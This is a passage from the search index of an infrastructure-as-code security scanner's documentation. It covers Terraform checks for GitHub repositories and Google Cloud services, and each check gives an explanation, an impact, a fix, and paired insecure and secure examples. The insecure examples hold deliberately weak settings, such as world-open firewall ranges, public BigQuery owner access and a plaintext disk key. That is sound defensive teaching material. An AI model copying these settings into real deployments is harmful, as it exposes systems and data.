\"public\"\n\n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/github/repositories/private/#secure-example","text":"<p>The following example will pass the github-repositories-private check. <pre><code> resource \"github_repository\" \"good_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n\n   visibility  = \"private\"\n\n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/github/repositories/private/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/integrations/github/latest/docs/resources/repository</p> </li> <li> <p>https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/about-repository-visibility</p> </li> <li> <p>https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/about-repository-visibility#about-internal-repositories</p> </li> </ul>","title":"Links"},{"location":"checks/google/","text":"","title":"google"},{"location":"checks/google/#services","text":"<ul> <li> <p>IAM</p> </li> <li> <p>bigquery</p> </li> <li> <p>compute</p> </li> <li> <p>dns</p> </li> <li> <p>gke</p> </li> <li> <p>iam</p> </li> <li> <p>kms</p> </li> <li> <p>sql</p> </li> <li> <p>storage</p> </li> </ul>","title":"Services"},{"location":"checks/google/bigquery/","text":"","title":"bigquery"},{"location":"checks/google/bigquery/#checks","text":"<ul> <li>no-public-access BigQuery datasets should only be accessible within the organisation</li> </ul>","title":"Checks"},{"location":"checks/google/bigquery/no-public-access/","text":"","title":"BigQuery datasets should only be accessible within the organisation"},{"location":"checks/google/bigquery/no-public-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/google/bigquery/no-public-access/#explanation","text":"<p>Using 'allAuthenticatedUsers' provides any GCP user - even those outside of your organisation - access to your BigQuery dataset.</p>","title":"Explanation"},{"location":"checks/google/bigquery/no-public-access/#possible-impact","text":"<p>Exposure of sensitive data to the public iniernet</p>","title":"Possible Impact"},{"location":"checks/google/bigquery/no-public-access/#suggested-resolution","text":"<p>Configure access permissions with higher granularity</p>","title":"Suggested Resolution"},{"location":"checks/google/bigquery/no-public-access/#insecure-example","text":"<p>The following example will fail the google-bigquery-no-public-access check. <pre><code> resource \"google_bigquery_dataset\" \"bad_example\" {\n   dataset_id                  = \"example_dataset\"\n   friendly_name               = \"test\"\n   description                 = \"This is a test description\"\n   location                    = \"EU\"\n   default_table_expiration_ms = 3600000\n\n   labels = {\n     env = \"default\"\n   }\n\n   access {\n     role          = \"OWNER\"\n     special_group = \"allAuthenticatedUsers\"\n   }\n\n   access {\n     role   = \"READER\"\n     domain = \"hashicorp.com\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/bigquery/no-public-access/#secure-example","text":"<p>The following example will pass the google-bigquery-no-public-access check. <pre><code> resource \"google_bigquery_dataset\" \"good_example\" {\n   dataset_id                  = \"example_dataset\"\n   friendly_name               = \"test\"\n   description                 = \"This is a test description\"\n   location                    = \"EU\"\n   default_table_expiration_ms = 3600000\n\n   labels = {\n     env = \"default\"\n   }\n\n   access {\n     role          = \"OWNER\"\n     user_by_email = google_service_account.bqowner.email\n   }\n\n   access {\n     role   = \"READER\"\n     domain = \"hashicorp.com\"\n   }\n }\n\n resource \"google_service_account\" \"bqowner\" {\n   account_id = \"bqowner\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/bigquery/no-public-access/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/bigquery_dataset#special_group</li> </ul>","title":"Links"},{"location":"checks/google/compute/","text":"","title":"compute"},{"location":"checks/google/compute/#checks","text":"<ul> <li> <p>disk-encryption-customer-key Disks should be encrypted with customer managed encryption keys</p> </li> <li> <p>disk-encryption-no-plaintext-key The encryption key used to encrypt a compute disk has been specified in plaintext.</p> </li> <li> <p>enable-shielded-vm-im Instances should have Shielded VM integrity monitoring enabled</p> </li> <li> <p>enable-shielded-vm-vtpm Instances should have Shielded VM VTPM enabled</p> </li> <li> <p>enable-vpc-flow-logs VPC flow logs should be enabled for all subnetworks</p> </li> <li> <p>no-default-service-account Instances should not use the default service account</p> </li> <li> <p>no-ip-forwarding Instances should not have IP forwarding enabled</p> </li> <li> <p>no-oslogin-override Instances should not override the project setting for OS Login</p> </li> <li> <p>no-project-wide-ssh-keys Disable project-wide SSH keys for all instances</p> </li> <li> <p>no-public-egress An outbound firewall rule allows traffic to /0.</p> </li> <li> <p>no-public-ingress An inbound firewall rule allows traffic from /0.</p> </li> <li> <p>no-public-ip Instances should not have public IP addresses</p> </li> <li> <p>no-serial-port Disable serial port connectivity for all instances</p> </li> <li> <p>project-level-oslogin OS Login should be enabled at project level</p> </li> <li> <p>use-secure-tls-policy SSL policies should enforce secure versions of TLS</p> </li> <li> <p>vm-disk-encryption-customer-key VM disks should be encrypted with Customer Supplied Encryption Keys</p> </li> </ul>","title":"Checks"},{"location":"checks/google/compute/disk-encryption-customer-key/","text":"","title":"Disks should be encrypted with customer managed encryption keys"},{"location":"checks/google/compute/disk-encryption-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/compute/disk-encryption-customer-key/#explanation","text":"<p>Using unmanaged keys makes rotation and general management difficult.</p>","title":"Explanation"},{"location":"checks/google/compute/disk-encryption-customer-key/#possible-impact","text":"<p>Using unmanaged keys does not allow for proper key management.</p>","title":"Possible Impact"},{"location":"checks/google/compute/disk-encryption-customer-key/#suggested-resolution","text":"<p>Use managed keys to encrypt disks.</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/disk-encryption-customer-key/#insecure-example","text":"<p>The following example will fail the google-compute-disk-encryption-customer-key check. <pre><code> resource \"google_compute_disk\" \"bad_example\" {\n   name  = \"test-disk\"\n   type  = \"pd-ssd\"\n   zone  = \"us-central1-a\"\n   image = \"debian-9-stretch-v20200805\"\n   labels = {\n     environment = \"dev\"\n   }\n   physical_block_size_bytes = 4096\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/disk-encryption-customer-key/#secure-example","text":"<p>The following example will pass the google-compute-disk-encryption-customer-key check. <pre><code> resource \"google_compute_disk\" \"good_example\" {\n   name  = \"test-disk\"\n   type  = \"pd-ssd\"\n   zone  = \"us-central1-a\"\n   image = \"debian-9-stretch-v20200805\"\n   labels = {\n     environment = \"dev\"\n   }\n   physical_block_size_bytes = 4096\n   disk_encryption_key {\n     kms_key_self_link = \"something\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/disk-encryption-customer-key/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link</li> </ul>","title":"Links"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/","text":"","title":"The encryption key used to encrypt a compute disk has been specified in plaintext."},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#explanation","text":"<p>Sensitive values such as raw encryption keys should not be included in your Terraform code, and should be stored securely by a secrets manager.</p>","title":"Explanation"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#possible-impact","text":"<p>The encryption key should be considered compromised as it is not stored securely.</p>","title":"Possible Impact"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#suggested-resolution","text":"<p>Reference a managed key rather than include the key in raw format.</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#insecure-example","text":"<p>The following example will fail the google-compute-disk-encryption-no-plaintext-key check. <pre><code> resource \"google_compute_disk\" \"good_example\" {\n    disk_encryption_key {\n        raw_key=\"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#secure-example","text":"<p>The following example will pass the google-compute-disk-encryption-no-plaintext-key check. <pre><code> resource \"google_compute_disk\" \"good_example\" {\n    disk_encryption_key {\n        kms_key_self_link = google_kms_crypto_key.my_crypto_key.id\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/disk-encryption-no-plaintext-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link</p> </li> <li> <p>https://cloud.google.com/compute/docs/disks/customer-supplied-encryption</p> </li> </ul>","title":"Links"},{"location":"checks/google/compute/enable-shielded-vm-im/","text":"","title":"Instances should have Shielded VM integrity monitoring enabled"},{"location":"checks/google/compute/enable-shielded-vm-im/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/compute/enable-shielded-vm-im/#explanation","text":"<p>Integrity monitoring helps you understand and make decisions about the state of your VM instances.</p>","title":"Explanation"},{"location":"checks/google/compute/enable-shielded-vm-im/#possible-impact","text":"<p>No visibility of VM instance boot state.</p>","title":"Possible Impact"},{"location":"checks/google/compute/enable-shielded-vm-im/#suggested-resolution","text":"<p>Enable Shielded VM Integrity Monitoring</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/enable-shielded-vm-im/#insecure-example","text":"<p>The following example will fail the google-compute-enable-shielded-vm-im check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   shielded_instance_config {\n     enable_integrity_monitoring = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/enable-shielded-vm-im/#secure-example","text":"<p>The following example will pass the google-compute-enable-shielded-vm-im check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   shielded_instance_config {\n     enable_integrity_monitoring = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/enable-shielded-vm-im/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm</p> </li> <li> <p>https://cloud.google.com/security/shielded-cloud/shielded-vm#integrity-monitoring</p> </li> </ul>","title":"Links"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/","text":"","title":"Instances should have Shielded VM VTPM enabled"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#explanation","text":"<p>The virtual TPM provides numerous security measures to your VM.</p>","title":"Explanation"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#possible-impact","text":"<p>Unable to prevent unwanted system state modification</p>","title":"Possible Impact"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#suggested-resolution","text":"<p>Enable Shielded VM VTPM</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#insecure-example","text":"<p>The following example will fail the google-compute-enable-shielded-vm-vtpm check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   shielded_instance_config {\n     enable_vtpm = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#secure-example","text":"<p>The following example will pass the google-compute-enable-shielded-vm-vtpm check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   shielded_instance_config {\n     enable_vtpm = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/enable-shielded-vm-vtpm/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm</p> </li> <li> <p>https://cloud.google.com/blog/products/identity-security/virtual-trusted-platform-module-for-shielded-vms-security-in-plaintext</p> </li> </ul>","title":"Links"},{"location":"checks/google/compute/enable-vpc-flow-logs/","text":"","title":"VPC flow logs should be enabled for all subnetworks"},{"location":"checks/google/compute/enable-vpc-flow-logs/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/compute/enable-vpc-flow-logs/#explanation","text":"<p>VPC flow logs record information about all traffic, which is a vital tool in reviewing anomalous traffic.</p>","title":"Explanation"},{"location":"checks/google/compute/enable-vpc-flow-logs/#possible-impact","text":"<p>Limited auditing capability and awareness</p>","title":"Possible Impact"},{"location":"checks/google/compute/enable-vpc-flow-logs/#suggested-resolution","text":"<p>Enable VPC flow logs</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/enable-vpc-flow-logs/#insecure-example","text":"<p>The following example will fail the google-compute-enable-vpc-flow-logs check. <pre><code>resource \"google_compute_subnetwork\" \"bad_example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n  secondary_ip_range {\n    range_name    = \"tf-test-secondary-range-update1\"\n    ip_cidr_range = \"192.168.10.0/24\"\n  }\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/enable-vpc-flow-logs/#secure-example","text":"<p>The following example will pass the google-compute-enable-vpc-flow-logs check. <pre><code>resource \"google_compute_subnetwork\" \"good_example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n  secondary_ip_range {\n    range_name    = \"tf-test-secondary-range-update1\"\n    ip_cidr_range = \"192.168.10.0/24\"\n  }\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/enable-vpc-flow-logs/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs</li> </ul>","title":"Links"},{"location":"checks/google/compute/no-default-service-account/","text":"","title":"Instances should not use the default service account"},{"location":"checks/google/compute/no-default-service-account/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/google/compute/no-default-service-account/#explanation","text":"<p>The default service account has full project access. Instances should instead be assigned the minimal access they need.</p>","title":"Explanation"},{"location":"checks/google/compute/no-default-service-account/#possible-impact","text":"<p>Instance has full access to the project</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-default-service-account/#suggested-resolution","text":"<p>Remove use of default service account</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-default-service-account/#insecure-example","text":"<p>The following example will fail the google-compute-no-default-service-account check. <pre><code> resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = \"1234567890-compute@developer.gserviceaccount.com\"\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-default-service-account/#secure-example","text":"<p>The following example will pass the google-compute-no-default-service-account check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     foo = \"bar\"\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-default-service-account/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#</li> </ul>","title":"Links"},{"location":"checks/google/compute/no-ip-forwarding/","text":"","title":"Instances should not have IP forwarding enabled"},{"location":"checks/google/compute/no-ip-forwarding/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/compute/no-ip-forwarding/#explanation","text":"<p>Disabling IP forwarding ensures the instance can only receive packets addressed to the instance and can only send packets with a source address of the instance.</p>","title":"Explanation"},{"location":"checks/google/compute/no-ip-forwarding/#possible-impact","text":"<p>Instance can send/receive packets without the explicit instance address</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-ip-forwarding/#suggested-resolution","text":"<p>Disable IP forwarding</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-ip-forwarding/#insecure-example","text":"<p>The following example will fail the google-compute-no-ip-forwarding check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   can_ip_forward = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-ip-forwarding/#secure-example","text":"<p>The following example will pass the google-compute-no-ip-forwarding check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   can_ip_forward = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-ip-forwarding/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#can_ip_forward</li> </ul>","title":"Links"},{"location":"checks/google/compute/no-oslogin-override/","text":"","title":"Instances should not override the project setting for OS Login"},{"location":"checks/google/compute/no-oslogin-override/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/compute/no-oslogin-override/#explanation","text":"<p>OS Login automatically revokes the relevant SSH keys when an IAM user has their access revoked.</p>","title":"Explanation"},{"location":"checks/google/compute/no-oslogin-override/#possible-impact","text":"<p>Access via SSH key cannot be revoked automatically when an IAM user is removed.</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-oslogin-override/#suggested-resolution","text":"<p>Enable OS Login at project level and remove instance-level overrides</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-oslogin-override/#insecure-example","text":"<p>The following example will fail the google-compute-no-oslogin-override check. <pre><code> resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   metadata = {\n     enable-oslogin = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-oslogin-override/#secure-example","text":"<p>The following example will pass the google-compute-no-oslogin-override check. <pre><code> resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   metadata = {\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-oslogin-override/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#</li> </ul>","title":"Links"},{"location":"checks/google/compute/no-project-wide-ssh-keys/","text":"","title":"Disable project-wide SSH keys for all instances"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#explanation","text":"<p>Use of project-wide SSH keys means that a compromise of any one of these key pairs can result in all instances being compromised. It is recommended to use instance-level keys.</p>","title":"Explanation"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#possible-impact","text":"<p>Compromise of a single key pair compromises all instances</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#suggested-resolution","text":"<p>Disable project-wide SSH keys</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#insecure-example","text":"<p>The following example will fail the google-compute-no-project-wide-ssh-keys check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     block-project-ssh-keys = false\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#secure-example","text":"<p>The following example will pass the google-compute-no-project-wide-ssh-keys check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     block-project-ssh-keys = true\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-project-wide-ssh-keys/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#</li> </ul>","title":"Links"},{"location":"checks/google/compute/no-public-egress/","text":"","title":"An outbound firewall rule allows traffic to /0."},{"location":"checks/google/compute/no-public-egress/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/google/compute/no-public-egress/#explanation","text":"<p>Network security rules should not use very broad subnets.</p> <p>Where possible, segments should be broken into smaller subnets and avoid using the <code>/0</code> subnet.</p>","title":"Explanation"},{"location":"checks/google/compute/no-public-egress/#possible-impact","text":"<p>The port is exposed for egress to the internet</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-public-egress/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-public-egress/#insecure-example","text":"<p>The following example will fail the google-compute-no-public-egress check. <pre><code>resource \"google_compute_firewall\" \"bad_example\" {\n  direction = \"EGRESS\"\n  allow {\n    protocol = \"icmp\"\n  }\n  destination_ranges = [\"0.0.0.0/0\"]\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-public-egress/#secure-example","text":"<p>The following example will pass the google-compute-no-public-egress check. <pre><code> resource \"google_compute_firewall\" \"good_example\" {\n  direction = \"EGRESS\"\n  allow {\n    protocol = \"icmp\"\n  }\n  destination_ranges = [\"1.2.3.4/32\"]\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-public-egress/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall</p> </li> <li> <p>https://cloud.google.com/vpc/docs/using-firewalls</p> </li> </ul>","title":"Links"},{"location":"checks/google/compute/no-public-ingress/","text":"","title":"An inbound firewall rule allows traffic from /0."},{"location":"checks/google/compute/no-public-ingress/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/google/compute/no-public-ingress/#explanation","text":"<p>Network security rules should not use very broad subnets.</p> <p>Where possible, segments should be broken into smaller subnets and avoid using the <code>/0</code> subnet.</p>","title":"Explanation"},{"location":"checks/google/compute/no-public-ingress/#possible-impact","text":"<p>The port is exposed for ingress from the internet</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-public-ingress/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-public-ingress/#insecure-example","text":"<p>The following example will fail the google-compute-no-public-ingress check. <pre><code>resource \"google_compute_firewall\" \"bad_example\" {\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"icmp\"\n  }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-public-ingress/#secure-example","text":"<p>The following example will pass the google-compute-no-public-ingress check. <pre><code>resource \"google_compute_firewall\" \"good_example\" {\n  source_ranges = [\"1.2.3.4/32\"]\n  allow {\n    protocol = \"icmp\"\n  }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-public-ingress/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges</p> </li> <li> <p>https://www.terraform.io/docs/providers/google/r/compute_firewall.html</p> </li> <li> <p>https://cloud.google.com/vpc/docs/using-firewalls</p> </li> </ul>","title":"Links"},{"location":"checks/google/compute/no-public-ip/","text":"","title":"Instances should not have public IP addresses"},{"location":"checks/google/compute/no-public-ip/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/compute/no-public-ip/#explanation","text":"<p>Instances should not be publicly exposed to the internet</p>","title":"Explanation"},{"location":"checks/google/compute/no-public-ip/#possible-impact","text":"<p>Direct exposure of an instance to the public internet</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-public-ip/#suggested-resolution","text":"<p>Remove public IP</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-public-ip/#insecure-example","text":"<p>The following example will fail the google-compute-no-public-ip check. <pre><code> resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-public-ip/#secure-example","text":"<p>The following example will pass the google-compute-no-public-ip check. <pre><code> resource \"google_compute_instance\" \"good_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-public-ip/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#access_config</p> </li> <li> <p>https://cloud.google.com/compute/docs/ip-addresses#externaladdresses</p> </li> </ul>","title":"Links"},{"location":"checks/google/compute/no-serial-port/","text":"","title":"Disable serial port connectivity for all instances"},{"location":"checks/google/compute/no-serial-port/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/compute/no-serial-port/#explanation","text":"<p>When serial port access is enabled, the access is not governed by network security rules meaning the port can be exposed publicly.</p>","title":"Explanation"},{"location":"checks/google/compute/no-serial-port/#possible-impact","text":"<p>Unrestricted network access to the serial console of the instance</p>","title":"Possible Impact"},{"location":"checks/google/compute/no-serial-port/#suggested-resolution","text":"<p>Disable serial port 